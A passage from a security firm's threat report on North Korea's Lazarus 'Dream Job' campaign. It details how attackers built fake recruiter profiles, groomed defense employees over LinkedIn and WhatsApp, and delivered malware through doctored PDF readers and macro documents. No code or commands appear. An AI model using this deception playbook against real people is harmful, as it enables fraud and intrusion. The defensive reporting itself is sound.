.................................................................................... 17 Attack Scenarios and Tools Analysis ............................................................................................................... 21 Introduction ................................................................................................................................................... 21 First Stage – Infection ................................................................................................................................... 22 First infection scenario – PDF files .......................................................................................................... 24 Second infection scenario – DOC files ................................................................................................... 27 Third infection scenario – DOTM files ..................................................................................................... 28 Second Stage – LNK and DLL Files .............................................................................................................. 28 The LNK File ............................................................................................................................................... 29 DBLL Dropper ............................................................................................................................................ 29 Third and Fourth Stages ............................................................................................................................... 30 General Overview ...................................................................................................................................... 30 Technical Analysis ..................................................................................................................................... 30 Fifth Stages – Additional Tools .................................................................................................................... 33 Attribution ........................................................................................................................................................... 35 Introduction ................................................................................................................................................... 35 Code Overlap ................................................................................................................................................. 35 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 2 | P a g e Operation ‘Dream Job’ Source Code Overlap ................................................................................................................................ 35 Similarities to known Lazarus Attack Tools and Advancement of Known Attack Methods New Attack Techniques .................................................................................................................................... 36 Techniques, Tactics and Procedures .......................................................................................................... 37 Target Sectors ................................................................................................................................................ 38 Summary and Insights ...................................................................................................................................... 39 About the Attacker ........................................................................................................................................ 39 Social engineering ......................................................................................................................................... 39 Recommendations ............................................................................................................................................ 41 Social Engineering ......................................................................................................................................... 41 Attack Mitigation ............................................................................................................................................ 41 Indicators of Compromise ................................................................................................................................ 43 Hashes ............................................................................................................................................................. 43 C2 Compromised Addresses ........................................................................................................................ 45 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 3 | P a g e Operation ‘Dream Job’ Introduction Executive Summary During June-August of 2020, ClearSky’s team had investigated an offensive campaign attributed with high probability to North Korea, which we call “Dream Job”. This campaign has been active since the beginning of the year and it succeeded, in our assessment, to infect several dozens of companies and organizations in Israel and globally. Its main targets include defense, governmental companies, and specific employees of those companies. Throughout the campaign, the North Korean “Lazarus” group (aka HIDDEN COBRA) succeeded in manipulating the targets with a “dream job” offering, which was sent to the employees of said targets. The “dream job” is supposedly sent on behalf of some of the most prominent defense and aerospace companies in the US, including Boeing, Lockheed Martin, and BAE. The infection and infiltration of target systems had been carried out through a widespread and sophisticated social engineering campaign, which included: reconnaissance, creation of fictitious LinkedIn profiles, sending emails to the targets’ personal addresses, and conducting a continuous dialogue with the target – directly on the phone, and over WhatsApp. Upon infection, the attackers collected intelligence regarding the company’s activity, and also its financial affairs, probably in order to try and steal some money from it. The double scenario of espionage and money theft is unique to North Korea, which operates intelligence units that steal both information and money for their country. In recent months, two parallel investigations, by ESET and McAfee, have been published, presenting attacks by the group against similar targets in other regions of the world. These publications contain several overlaps with the attack scenarios that we present in this report. In this report, we explain how the attack was conducted – with LinkedIn as the main attack and manipulation platform – and reveal the main infection scenarios of “Dream Job”, including social engineering tactics and the malware used by the attackers. We assess this to be this year’s main offensive campaign by the Lazarus group, and it embodies the sum of the group’s accumulative knowledge on infiltration to companies and organizations around the globe. In our estimation, the group operates dozens of researchers and intelligence personnel to maintain the campaign globally. In 2019, we have revealed evidence of Lazarus’ attack in Israel, whereas the North Korean espionage group had attempted to infiltrate the network of an Israeli defense company, and since this attack we have been monitoring the group’s activity in Israel. In recent months, we have succeeded in identifying new indications of the group’s activity in Israel. This report summarizes the investigation we have conducted, with the help of our customers, and though which we have revealed and analyzed several attacks conducted by the group. In the report we present the campaign’s attack scenarios, which include sending a bait to download a file, supposedly containing details of a “dream job” in well-known organizations, mainly in the aerospace sector. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 4 | P a g e Operation ‘Dream Job’ This report’s main findings include: • Social engineering chapter, which presents the stages to targets’ infection and the social engineering tactics used to manipulate it. • Offensive tools’ analysis chapter, which surveys the three infection scenarios in this campaign: o o o Infection through a malicious PDF file in an open-source PDF reader, which was altered to fit the group’s needs. This is the first time this scenario is revealed publicly. Infection through a Dotm file, which is downloaded from a breached server, takes the place of the original file, and runs a malicious macro on the target Infection through a Doc file containing a malicious macro. Lazarus / Hidden Cobra – a North Korean APT group The Lazarus group, also tracked as APT38 and HIDDEN COBRA, and two affiliated sub-groups Bluenoroff and Andariel1, are North Korean espionage groups which gained notoriety for the first time in 2014, following the Sony breach. That breach was an act of revenge to produce a comedy movie, “The Interview”, which was seen by Pyongyang as a threat and humiliation for its leader2. As a result, most of Sony’s IT infrastructure has been deleted, and the company’s activities were out of order for several months. In 2017, the group had conducted one of the most significant ransomware attacks in history; the attack, named WannaCry, halted the work of dozens of companies around the world, and caused billions of dollars in direct and indirect damages. The attack placed North Korea as a prominent threat in cyberspace3. However, Lazarus’ main activity lies in the financial domain. The group’s activity appears to be a part of North Korean government’s effort to circumvent the long-standing sanctions placed mainly by the United States and the United Nations. Indeed, according to one of the UN’s reports from August 2019, the group succeeded in stealing more than 2 billion dollars to finance Pyongyang’s nuclear program4. The group stands behind several significant cyber heist attempts, while the most well-known is the attack on the central Bangladeshi bank, resulting in theft of 81 million dollars5. Originally, the group tried to steal a sum as high as 950 million, but the attack was hamstringed by a human error of the attackers. Another attack, which was tied to Lazarus and is particularly interesting in the context of this report, took place in 2019 against Redbanc6, a company that connects the clearing infrastructure of Chile’s banks. One of the attack’s characteristics, which was not seen in Lazarus’ attacks until then, was 1 attack.mitre.org/groups/G0032/ 2 en.wikipedia.org/wiki/Sony_Pictures_hack 3 38north.org/2020/02/skleineahlbrandt022820/ 4 reuters.com/article/us-northkorea-cyber-un/north-korea-took-2-billion-in-cyberattacks-to-fund-weapons- program-u-n-report-idUSKCN1UV1ZX 5 reuters.com/article/us-cyber-heist-bangladesh-northkorea/cyber-security-firm-more-evidence-north-korea- linked-to-bangladesh-heist-idUSKBN1752I4 6 zdnet.com/article/north-korean-hackers-infiltrate-chiles-atm-network-after-skype-job-interview/ ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 5 | P a g e Operation ‘Dream Job’ a direct contact with the target. The attackers had impersonated HR hiring personnel and conducted interviews, also in Spanish, with the victims, mostly on Skype. Maintaining direct contact, beyond sending phishing emails, is relatively rare in nation-state espionage groups (APTs); however, as it will be shown in this report, Lazarus have adopted this tactic to ensure the success of their attacks. In 2019, the group seemed to have shifted its focus from classical financial institutions to cryptocurrency exchanges and development of offensive tools for Mac and Linux operational systems, in addition to the known tools for Windows. The group’s most widespread attack scenario has been creation of an internet page for a front company which deals, supposedly, with cryptocurrency trading. At that page, the victim could download a trading app, which was indeed installed on the victim’s computer, but alongside it was also installed a tool that collected information on the victim. Kaspersky called the campaign “AppleJeus”7. The group’s variety of tools and its determination attracted the attention of American intelligence and law enforcement agencies, manifested in sanctions8 (some of which were already in effect because of the group’s affiliation with North Korea) and publication of tools related to the group9. Lazarus is one of the groups, which the US focused on specifically, as part of its Cyber Command and the Department of Homeland Security’s effort to hamstring offensive cyber infrastructures of rival countries. Previous research Lazarus’ attack against an Israeli defense company in 2019 One of the group’s first targeted attacks, identified by us in March 2019 and tied to it based on similarity in technical details, targeted an Israeli security company. During the campaign, an email has been sent, in flawed Hebrew, to one of the company’s employees. The sender’s address was from within the company, meaning the attacker had already gained access to one internal email address at least. To the email was attached a WinRAR archive, vulnerable to the CVE-2018-2025010 vulnerability, which ran a malicious file in parallel to the archive’s opening. 7 securelist.com/operation-applejeus/87553/ securelist.com/operation-applejeus-sequel/95596/ 8 home.treasury.gov/news/press-releases/sm924 9 us-cert.cisa.gov/northkorea 10 nvd.nist.gov/vuln/detail/CVE-2018-20250 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 6 | P a g e Operation ‘Dream Job’ The malicious email in Hebrew The malicious executable, run in parallel to the archive file, is a small and basic backdoor, which collects information on the infected computer, apparently for value assessment before further infection, and reports to several hardcoded command-and-control (C2) servers. The tool uses a forged User-Agent of the following form: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) A code check performed with Intezer Analyzer revealed some similarity between the source code of the malware that we have found, and known Lazarus samples, specifically those identified in another campaign, from 2018. The campaign analyzed and named “Operation Sharpshooter”11 by McAfee, had targeted 87 organizations in 24 countries in the defense, communications, and energy (also nuclear) sectors. That campaign’s scenario was different from the one we have found, but code similarity and the connection to a campaign with similar targets strengthened the connection to Lazarus. Operation In(ter)ception: ESET’s research on Lazarus’ attacks published in June 2020 In June 2020, ESET has published a research12 on the group’s campaign, which attacked defense and aerospace companies in Europe and the Middle East, between September and December 2019. The campaign, which was named “In(ter)ception” after one of the malicious files downloaded by it, made wide use of social engineering and relied on a modular malware to collect reconnaissance on target networks. We present the main findings of the ESET report, because it served as a basis for our research and because it depicts one of the scenarios that we have identified in Israel as well. According to ESET, the attackers made initial contact with the targets through LinkedIn. The attackers created profiles impersonating HR recruiters from international companies in the defense and aerospace sectors. The copycat profiles sent job offers to the targets, and if those showed interest, a 11 mcafee.com/enterprise/en-us/assets/reports/rp-operation-sharpshooter.pdf 12 welivesecurity.com/2020/06/17/operation-interception-aerospace-military-companies-cyberspies/ ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 7 | P a g e Operation ‘Dream Job’ password-protected archive was sent directly or through OneDrive. Upon verifying the activation of the file (the target asked, “what is the password?”), the copycat profiles were deleted. In the archive was a LNK file, which runs several commands in the command line: first, a remote PDF is opened and presented to the target, for distraction; second, a new folder is created, to which a WMI command line file is copied under a different name; finally, a scheduled task is created, in order to ensure initial persistence on the infected computer. Upon gaining initial access and collecting basic information on target computer – mostly network mapping through Active Directory querying – the attack continues. Through the scheduled task, an XSL script is downloaded from an attacker-controlled server; this script downloads the data needed to create and load the downloader, decodes it from base64 with certutil and loads the resulting malicious DLL. The DLL, which is the downloader for the main tool, downloads the tool’s source code from the C2 server and loads it in memory. Because each downloader contains the unique key required to decrypt the main tool, it is possible that there are several scenarios with potentially different keys and tools (ClearSky research indeed found additional scenarios). The main tool, a DLL, can fingerprint the target computer, and communicate and work with the configuration file and the modules that are downloaded from the C2 server and add more capabilities to the tool. The tool can report the list of existent modules back to the operator, probably to allow capability assessment. Each module can contain up to 4 functions, while several modules can be active at the same time. Also, all the tool’s capabilities are initiated as classes during the bootstrapping phase, therefore the modules activate capabilities by using the corresponding classes. Finally, the collected information is packed in a RAR archive and uploaded to Dropbox. Although the main goal of the campaign appears to be espionage, the attackers were seen exploiting the access and the information on the infected computers to conduct business email compromise (BEC) fraud. The attackers identified on infected computers information about some invoices to pay, created domains and email addresses to resemble the infected organization, and sent messages, demanding to pay the invoices to the new addresses. Although this scam did not work, this combination of information and money theft is rare and characterizes the North Koreans. Operation North Star: McAfee’s research on Lazarus’ attacks published in July 2020 In July 2020, another research13 has been published, by McAfee, which presents another attack scenario of the “Dream Job” campaign. Although McAfee did not associate the scenario, they have found with ESET’s research, they did attribute the campaign to Lazarus and pointed out the similarities with the scenario ESET have found. Through the scenario identified by McAfee, job offerings in the aforementioned sectors were sent as malicious Docx files, which presented the target with decoy documents and downloaded a malicious file template as well. The malicious template, a file with the Dotm extension, injected a malicious DLL library to the target computer, in order to conduct basic reconnaissance on it. 13 mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/ ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 8 | P a g e Operation ‘Dream Job’ The malicious library, which was hardcoded in the template, is a “doctored” version of some legitimate library, mostly of SQLite. In other words, the injected library is originally benign, and it was altered with malicious functions which, as mentioned, collect initial information on the target, for further evaluation. In order to load the malicious functions of the library, the template contains a VBA script. Which not only contains the instructions to load the library, but also two of the five parameters required to do it. When two parameters form the script, and three parameters from the library’s source code are present, the malicious functions load properly. It is interesting to note, that the library uses only two parameters, however all five must be present. For additional camouflage, when the library connects to the C2 server, it mimics the computer’s User-Agent, and if none found – it mimics Mozilla’s default User-Agent. Simultaneously with those actions, the malicious template also creates a LNK shortcut in the Startup folder of the infected computer, thus ensuring persistence; this is in contrast with ESET’s findings of a scheduled task as persistence mechanism. Attack Vector – Job Seekers’ Recruitment Campaign Impersonation of recruitment managers and reaching out to job seekers is a popular practice among APT groups that rely on social engineering. Since the beginning of 2020, Lazarus also operates a campaign the focuses on enticing job seekers with attractive places. However, North Korea is not the only state that uses this tactic: Iran – and APT33 in particular – operates a widespread campaign that focuses on recruiters’ impersonation too14. The use of this method of reaching out to the target with a tempting offer gives the attackers several advantages: 1. Creating a personal connection with the target and creating a false feeling of benefit from the conversation. 2. Approaching an employee with a tempting job offer limits the target’s ability to speak about it with colleagues and prevents information sharing that could jeopardize the whole campaign. 3. The need of discretion is an important component of this process, because the attacker can manipulate the target to do certain actions under the pretense of discretion, for example sending an infected file to the target’s personal email address (also bypassing corporate security solutions). In recent months, and especially since the beginning of the COVID-19 pandemic, there was an uptick in the will of employees to join big, stable working places with better conditions (a “dream job”). This tendency characterizes periods of crisis and adds to the attackers’ ability to “press on sensitive spots” of their targets and persuade them to continue with the infection. Working remotely is another 14 fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 9 | P a g e Operation ‘Dream Job’ important component of the attackers’ ability to impersonate persons that the targets have never met, because many business connections are virtual now. However, such social engineering tactics also have their deficiencies. For the attack to succeed, the attacker is almost completely dependent on the target and its cooperation. The attacker needs to employ sophisticated manipulations of deception and persuasion, because any little suspicion may lead to fail and wasted means. The attackers are in risk of their infected files being opened on a cellphone or in a house network rather than the corporate, which will lead the attackers to a dead end. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 10 | P a g e Operation ‘Dream Job’ Tools Used by the Espionage Group in the “Dream Job” Campaign In “Dream Job” campaign, the group used a variety of tools to infect the target and secure a “foothold” in the infected organization. The main part of our review of the campaign deals with the different tools and social engineering tactics which made the target open the infected file on their computer. Most of the employed tools were developed by the group itself, and some legitimate tools have been modified as well to fit the group’s goals. However, we saw that when the group fails to activate and operate its own tools, it turns to publicly available tools, some of which are not free. The tools used by the group may be divided into several groups: 1. Self-developed tools – tools ingeniously created for this particular campaign. In this campaign we have identified several such tools, while most of them are files intended to infect the target computer. Following is a categorized list of those tools: a. Offensive tools: i. DBLL Dropper – a DLL file suited for both 32 and 64-bit systems. Those files install the malicious EXE, which is the main RAT. We have called it like that because its extension is, mostly, .db. ii. DRATzarus – a self-developed RAT, installed from DBLL Dropper. This file shares similarities with a RAT developed by a group called “Bankshot”, and it allows the attackers to install different open source tools. iii. LNK file for redundancy – file which allows the attackers to re-install the malware on target computer and maintains their “foothold” on the target. b. Attack methods: i. A malicious macro embedded in Doc and Dotm files – a malicious piece of code that installs three files used in the second stage of the infection. ii. A Docx file with a malicious template (Template injection) – a file that downloads the malicious file from the C2 server, which is a breached site, and activates it (the malicious file) instead of the original Docx file. 2. Open source tools – tools used by the group in the fifth stage (when it fails to operate on the target computer). These tools are used to harvest high-privilege credentials on the target, maintain persistence etc. Some of those tools were bought by the group. Tools and Offensive Techniques Categorized with MITRE ATT&CK The different tools and techniques used by the group are divided in the following table into two types: 1. Intrusion – the initial penetration stage. At this stage, the attackers lure the target, through social engineering, to open the infected file on the target’s computer at work, all this while studying the target’s routine. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 11 | P a g e Operation ‘Dream Job’ 2. Exploitation – upon successfully enticing the target to open the infected file, the attackers install the RAT and secure their foothold in the organization. The following table shows the overlaps between the tools and techniques that we have found in the campaign and those used by the Lazarus espionage group. Kill Chain Phase Techniques, Tools Procedures and Intrusion Technique Technique Title MITRE ATT&CK Social media impersonation – LinkedIn Social engineering methods – communication with the victim, phone calls, WhatsApp’s conversations Build social network persona – T1341 Conduct social engineering – T1268 User Execution: Malicious File – T1204.002 Technique Spear phishing Phishing: Spear phishing Attachment – T1566.001 Procedures Using file hosting Adversary OPSEC – TA0021 services like DropBox and OneDrive Acquire and/or use 3rd party software services – T1308 Technique Sending decoy file Obfuscated Files or Information - T1027 Procedures Archives (WinRAR or 7- Data Compressed –T1002 ZIP) Exploitation Technique + Anti VM Virtualization/Sandbox Evasion: Tool Tool System Checks – T1497 Template injection - Exfiltration Over C2 Channel – downloading files from T1041 C2 Template Injection – T1221 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 12 | P a g e Operation ‘Dream Job’ Tool Visual Basic Macro code – Embedded in a DOC / DOTM file Scripting - T1064 User Execution: Malicious File – T1204.002 Techniques Communication with Web Service – T1102 C2 Tool Modified Sumarta PDF reader User Execution: Malicious File – T1204.002 Tool DBLL Dropper Tool LNK file Exploitation for Client Execution – T1203 Hijack Execution Flow: DLL Search Order Hijacking – T1574.001 Hide Artifacts: Hidden Files and Directories – T1564 Boot or Logon AutoStart Execution: Shortcut Modification – T1547.009 Tool RATzarus Remote Access Software – T1219 Similarity with Bankshot – S0239 Tool Open source tools such Remote Access Software – T1219 as Wake-On-Lan, Responder.py and ChromePass Credentials from Password Stores: Credentials from Web Browsers - T1555.003 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 13 | P a g e Operation ‘Dream Job’ Social Engineering Attack Infrastructure Introduction To gain control over the victim machines, Lazarus used social engineering techniques. Attackers use such techniques to disguise themselves as colleagues, legitimate service providers etc. thus luring users into disclosing private account information or granting the attackers access to machines or resources, without having to find and exploit a vulnerability. Lazarus is known for its focus on social engineering and its development of advanced fraud operations. In early 2019, the group executed an attack against Redbanc – a Chilean interbank network that connected all of the country’s ATM machines together – by establishing direct contact with the victim. The attackers impersonated Human Resources recruiters of grand corporates and conducted job interviews with their victims, over the phone and even via Skype, in both English and Spanish. During our research we uncovered social engineering techniques utilized by the group in this campaign, meant to persuade the victim to open a malicious file using his personal or corporate computer. Similar to the Redbanc campaign, we found evidence to the use of LinkedIn as part of the fraud operations carried out in this campaign. The attackers had long conversations with the victims, lasting several days to several weeks, during which they utilized techniques meant to lend them credibility. The following is a summary of all social engineering techniques used by the group: 1. Creating a fictitious profile impersonating a legitimate company employee (e.g. Boeing) relevant to the potential victim’s background. 2. Joining the potential victim’s social circles by adding its friends on social media, thus establishing trust and reliability. 3. Initiating primary contact in English and having a conversation in which the victim im is offered to start a discreet recruitment process for a covered position in their company. 4. An extensive correspondence with the victim, that sometimes lasts days and even weeks, including phone calls and WhatsApp texts. Accompanying the target throughout the actual infection process, in which a malicious file is sent to the victim. Social Engineering methods used to Establish a Credible Attack Infrastructure First Stage – Creating a Reliable Fictitious Entity As mentioned in the above introduction, Lazarus group usually initiates contact with its victims using fictitious accounts allegedly belonging to recruitment experts in various companies, usually companies affiliated with the aviation and defense sectors such as Boeing and Lockheed Martin. In the researched campaign Lazarus uses LinkedIn accounts – an informed choice as LinkedIn is a business and employment-oriented media most often used by job seekers and recruiters. Furthermore, in many cases no validation process precedes the approval of new friends. Low awareness and lack of ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 14 | P a g e Operation ‘Dream Job’ validation techniques make it easy for the attackers to create multiple fictitious entities and establish the impression that the attacker’s entity is part of your business-related social circle. This process can easily take place using Twitter as well, unlike Facebook. Upon creating a fictitious profile, the attacker adds to its account friends from the alleged company for which he works (e.g. Boeing) as well as from the victim’s workplace to maximize its credibility and minimize the target’s suspicion. Fictitious entities are not created in masses – they are carefully tailored to the victims and the operation designed for them, based on extensive reconnaissance research. During our investigation we were able to identify several tailored fictitious accounts. In some cases, Lazarus attackers create an entirely new entity whereas in others they base their account on a real profile found on the media. In these cases, the impostor account is fully copied from the real profile. For example, an account impersonating a Human Resources recruiter from Boeing can be created based on a real recruiter’s account, and a simple Google search would lead to both the real and fictitious accounts. Unlike the original profile, the fictitious one would contain numbers in its URI, instead of a full name, as can be seen in the below Google search screenshot. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 15 | P a g e Operation ‘Dream Job’ Following is an example of a profile created to attack employees of defense companies in Israel: 1. The real profile of a recruiter from Boeing: Real: https://www.linkedin.com/in/danakurek 2. The fake profile that apparently was deleted after the attackers finished the impersonation Fake: https://www.linkedin.com/in/dana-lopp-4132121b0 Second Stage – Luring the victim via a Job Posting Once a reliable fictitious entity has been created – a process which could take weeks, if not months – the attackers reach out to the victim using the profile, offering them a job at the company for which they allegedly recruit. The attackers offer the victim to begin a discreet recruitment process which ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 16 | P a g e Operation ‘Dream Job’ discussing the position and process in detail. Below here is a simulation of an initial correspondence between Lazarus attackers and a victim via LinkedIn. Third Stage – Attacker-Victim Communication The communication about the job offer between the attacker behind the fictitious profile and the victim can take weeks in not months. As the attackers initiate the contact, the in many cases the victim is not looking for a new job or willing to leave its current position, the collaboration is not instant. Significant persuasion efforts may be required to get the victim to review the offer tailored for them. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 17 | P a g e Operation ‘Dream Job’ Unlike other known attack methods, in which most of the efforts are invested in the primary contact, in this attack scenario efforts and resources are put into both the entity creation and the communication with the victims. Even if the victim is not interested in the position offered by the attacker, he is persuaded to fully review the details of the eligible position offered exclusively for him before making up his mind and taking the final decision. The job offer is tailored and discreet – increasing its reliability and decreasing the suspicion that a targeted attack is taking place. The discretion enables the attacker to negotiate with the attackers in length, as its current position is not endangered by the process. The communication begins in the social media, but swiftly proceeds over the phone via WhatsApp, or by the victim’s personal email, allegedly to ensure discretion. In reality, the transition is meant bypass security mechanisms and software implemented on the victim’s company account. The use of an instant messaging application to conduct phone calls – in this case WhatsApp – as part of the attack process is unique to this campaign and has not been exposed before. It is a risky choice and a highly sensitive operation, as the use of the wrong slang or accent can expose the entire operation. Phone ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 18 | P a g e Operation ‘Dream Job’ calls take place in later stages as well, when the victim encounters technical problems running the malicious files on his machine – further information can be found below in the next chapter of the report. Sample initial correspondence between the attackers and the victim over WhatsApp (the mistakes appear in the source): ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 19 | P a g e Operation ‘Dream Job’ Fourth Stage – Infection with Malware After gaining the victim’s trust and persuading him to accept the job offer details, the attackers send the victim a file using the storage services OneDrive of Dropbox. The attackers attempt to make the victim download the file at his workplace – they do so by studying his daily routine and sending the file at a carefully selected time. Please note that up until this stage, the attackers avoided using the target’s corporate email account. Upon accessing the storage server, the victim downloads an archive file from which the malicious files are extracted. The file names match the company and position discussed before, and the attackers verify with the victim that he has indeed accessed the file. At this point, the attackers abruptly cease all communication with the victim. They also close and delete profiles used to contact the victim. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 20 | P a g e Operation ‘Dream Job’ Attack Scenarios and Tools Analysis Introduction In the last chapter we have reviewed the social engineering scenario the attackers employ to gain the victim’s trust and send the infection file. During analysis conducted on our customers, we have identified five stages to the attack – from the moment the victim receives the malicious file to the installation of tools on their computer. Following is the summary of the five stages: 1. First Stage – at this stage, the attackers continue the social engineering and manipulate the target to open the malicious file on target computer. This is the only stage where we have identified different scenarios – the three infection scenarios will be detailed further. In the first infection scenario, the group uses malicious PDF files and a PDF reader altered for the group’s needs, while in the second and third scenarios the group uses doc files with an embedded malicious macro code. In ESET’s June report, a similar scenario was revealed, which uses PDF files as decoys; however, in our research we have identified new infection scenarios. Another characteristic we have seen is the variety of the decoy documents: it seems that the attackers fit the files for each target. Details on the three infection scenarios: a. b. c. Infection through a malicious PDF file, run with an attacker-modified PDF reader. This scenario was not revealed until today. Infection through a DOC file, which activates a malicious macro code. Infection through a DOTM file, which is downloaded from the C2 server and activates a macro code. 2. Second Stage – installation of a LNK file (for redundancy) and a DLL library (drops the malware itself): throughout this stage, the attackers install three new files on the target computer. The first file is a legitimate file used as a bait, the second file is a LNK file used to maintain persistence and redundancy on the target, and the third file is a DLL file – which we call DBLL Dropper – the file drops the main RAT on the target. 3. Third and Fourth Stages – installation of a malicious file on the target and dropping of the RAT from it. At this stage, the attackers gain access to the target computer. 4. Fifth Stage – installation of additional tools with the access provided by the RAT; the tools allow the attacker to perform different actions on the target computer. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 21 | P a g e Operation ‘Dream Job’ First Stage – Infection The infection process which will be described in this chapter includes three scenarios employed by the group. All the infection scenarios begin with sending a link to a file storage service, such as OneDrive or DropBox, after gaining the target’s trust. The link is passed to the target through WhatsApp or to the personal email address, apparently in the target’s working hours, so they will be inclined to open it from the corporate working station. In the storage service, the target will find a ZIP or RAR file larger than 30 megabytes, containing the bait file. Using archive-type files help the attacker to bypass the corporate protection solutions, and their size help them avoid being downloaded to public sandboxes like any.run, thus complicating the investigation. The file itself is passed, as mentioned earlier, under the pretense of containing information on an open position and includes the salary, the details on the supposed position, and official logos. Most of the suggested positions are finance-related. After downloaded the file, the target will be asked to extract the bait document and open it. The bait document does not contain information on the position – only the company’s logo and the title of the document. The full document is revealed only after the rest of the files – both malicious and innocuous – are dropped. It is worth the note, that dropping the clean decoy document is unique and rare, because in most cases the attackers who use decoy documents do not provide a legitimate file. This tactic is used to gain the victim’s trust and dispel any suspicion of a cyber-attack. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 22 | P a g e Operation ‘Dream Job’ The attackers act with much sensitivity and with high operational security (OPSEC). The infection scenarios are completely compartmentalized, so that there will be no queries to the same directory at the C2 server from two different files. Also, every target gets a file with a different hash value, which makes blocking difficult. Analysis of the files shows, that they cannot run on computers that have the Korean, Japanese, or Chinese language preferences; this limitation resembles the Russian-speaking crime groups, which generally limit their tools to countries outside of the Commonwealth of Independent States (CIS). During our analysis, we have identified several main, self-developed tools with a very high level of sophistication. In addition to those, we have seen the attackers install tools which are not necessarily self-developed – some can be downloaded freely on the net (e.g. the Chrome password extractor), and some can be purchased. If the attackers feel like they fail to operate on the infected computer, they seem to lower their OPSEC standards. The following describes the three infection scenarios. Several examples of the different bait files: ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 23 | P a g e Operation ‘Dream Job’ First infection scenario – PDF files This scenario is new and has never been publicly revealed before. In ESET’s analysis on “Operation In(ter)ception”, they did show use of innocuous PDF files as bait or decoy documents, however those were only dropped by an extracted LNK file. It should be reminded, that in the 2014 Sony breach the group used clean PDF files as well15.The cardinal difference between this scenario and the other scenarios in this report is the use of PDF files and not DOC/DOCX. First, the victim will receive a PDF file with the job offer. When they will try to open it on their computer with a regular viewer, they will be presented with the first page, containing the impersonated company’s logo, but without the offer. After that, the victim will tell the attacker that they cannot see the rest of the document; the attacker will send an ISO file, which is downloaded from a file storage service. The ISO file contains a special PDF reader, named “InternalViewer”. Based on a check we have performed, InternalViewer files can only run on 64-bit systems. Following is a screenshot with the ISO file and those files (the malicious PDF and its reader): Those files have few indications on scanning systems. In VirusTotal, the group’s only ISO file is not identified at all by any of the scanning engines, while the InternalViewer file is identified only by 4 engines (as of writing this report). That file is an open-source PDF reader called Sumatra, which was modified by the attackers16. 15 operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf 16 sumatrapdfreader.org/free-pdf-reader.html ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 24 | P a g e Operation ‘Dream Job’ This is how the bait file is presented in a legitimate PDF reader: When run through the altered PDF reader, the file will be rewritten: This is how the bait file will look while run through the altered PDF reader: ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 25 | P a g e Operation ‘Dream Job’ The InternalViewer file – upon running – will be substituted with a 